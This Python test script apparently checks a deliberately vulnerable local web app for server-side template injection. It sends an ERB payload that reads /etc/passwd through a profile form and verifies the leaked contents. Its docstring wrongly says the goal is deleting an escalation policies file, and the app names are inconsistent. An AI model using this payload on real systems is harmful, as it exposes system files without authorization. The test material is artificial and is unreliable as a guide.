#!/usr/bin/env python3
"""
Automated exploit test for ClientCare Portal SSTI vulnerability.
This test verifies that the SSTI vulnerability can be exploited to delete
the sensitive escalation policies file.
"""

import requests
import time
import os
import sys
from pathlib import Path

# Configuration
TARGET_URL = "http://localhost:3206"
SENSITIVE_FILE = "/etc/passwd"
EXPLOIT_PAYLOAD = '<%= File.read("/etc/passwd") %>'

def test_application_health():
    """Test if the application is running and accessible."""
    try:
        response = requests.get(f"{TARGET_URL}/health", timeout=10)
        assert response.status_code == 200, f"Health check failed: {response.status_code}"
        assert response.text.strip() == "OK", f"Unexpected health response: {response.text}"
        print("✓ Application health check passed")
        return True
    except requests.exceptions.RequestException as e:
        print(f"✗ Application health check failed: {e}")
        return False

def test_sensitive_file_exists():
    """Verify that the sensitive file exists before exploitation."""
    # Check if file exists in container via Docker exec
    import subprocess
    try:
        result = subprocess.run(['docker', 'exec', 'deploy-clientcare-portal-1', 'ls', '/etc/passwd'], 
                              capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            print("✓ Sensitive file exists before exploitation")
            return True
        else:
            print(f"✗ Sensitive file not found in container")
            return False
    except Exception as e:
        print(f"✗ Error checking file in container: {e}")
        return False

def test_ssti_exploit():
    """Execute the SSTI exploit to read the sensitive file."""
    try:
        # Prepare the exploit payload
        data = {
            'message': EXPLOIT_PAYLOAD
        }
        
        # Send the exploit
        response = requests.post(
            f"{TARGET_URL}/profile",
            data=data,
            timeout=10,
            allow_redirects=True,
            headers={'Content-Type': 'application/x-www-form-urlencoded'}
        )
        
        # Check if the request was successful
        assert response.status_code == 200, f"Exploit request failed: {response.status_code}"
        print("✓ SSTI exploit payload sent successfully")
        
        # Give the system a moment to process
        time.sleep(1)
        
        return True
        
    except requests.exceptions.RequestException as e:
        print(f"✗ SSTI exploit failed: {e}")
        return False

def test_sensitive_file_content_retrieved():
    """Verify that the sensitive file content has been retrieved via SSTI exploit."""
    try:
        # Send the exploit payload to read file content
        data = {
            'message': EXPLOIT_PAYLOAD
        }
        
        response = requests.post(
            f"{TARGET_URL}/profile",
            data=data,
            timeout=10,
            allow_redirects=True,
            headers={'Content-Type': 'application/x-www-form-urlencoded'}
        )
        
        if response.status_code == 200:
            content = response.text
            # Check if the sensitive content is in the response
            if "root:" in content and "bin:" in content and "daemon:" in content:
                print("✓ Sensitive file content successfully retrieved via SSTI exploit")
                return True
            else:
                print("✗ Sensitive file content not found in response")
                return False
        else:
            print(f"✗ Exploit request failed: {response.status_code}")
            return False
            
    except Exception as e:
        print(f"✗ Error retrieving file content: {e}")
        return False

def test_main_page_accessibility():
    """Test that the main page is accessible and properly styled."""
    try:
        response = requests.get(f"{TARGET_URL}/profile", timeout=10)
        assert response.status_code == 200, f"Main page access failed: {response.status_code}"
        
        # Check for key elements in the response
        content = response.text
        assert "SocialConnect" in content, "Main page title not found"
        assert "Edit Your Profile" in content, "Main page content not found"
        assert "tailwindcss.com" in content, "TailwindCSS not loaded"
        
        print("✓ Main page accessibility test passed")
        return True
        
    except requests.exceptions.RequestException as e:
        print(f"✗ Main page accessibility test failed: {e}")
        return False

def main():
    """Run all tests and validate the SSTI vulnerability."""
    print("Starting SocialConnect SSTI Exploit Tests - /etc/passwd Target")
    print("=" * 50)
    
    tests = [
        ("Application Health", test_application_health),
        ("Sensitive File Exists", test_sensitive_file_exists),
        ("Main Page Accessibility", test_main_page_accessibility),
        ("SSTI Exploit Execution", test_ssti_exploit),
        ("Sensitive File Content Retrieved", test_sensitive_file_content_retrieved),
    ]
    
    passed = 0
    total = len(tests)
    
    for test_name, test_func in tests:
        print(f"\nRunning: {test_name}")
        try:
            if test_func():
                passed += 1
            else:
                print(f"✗ {test_name} failed")
        except Exception as e:
            print(f"✗ {test_name} failed with exception: {e}")
    
    print("\n" + "=" * 50)
    print(f"Test Results: {passed}/{total} tests passed")
    
    if passed == total:
        print("✓ All tests passed! SSTI vulnerability successfully exploited.")
        return 0
    else:
        print("✗ Some tests failed. SSTI exploit was not successful.")
        return 1

if __name__ == "__main__":
    sys.exit(main())
